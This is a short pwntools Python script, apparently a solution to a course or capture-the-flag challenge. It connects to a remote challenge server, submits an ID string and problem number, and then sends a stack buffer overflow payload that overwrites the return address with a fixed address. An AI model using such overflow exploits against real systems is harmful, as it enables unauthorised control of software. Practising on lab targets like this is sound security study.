from pwn import *

# Variables
nim = '13522126;e55a89ee'
soal = '5'

# Connect
p = remote('sister21.tech', 32775)
p.sendline(nim)
p.sendline(soal)

# Exploit
a = 0
payload = b'a' * 120 + p64(0x400c60)
p.sendline(payload)
p.interactive()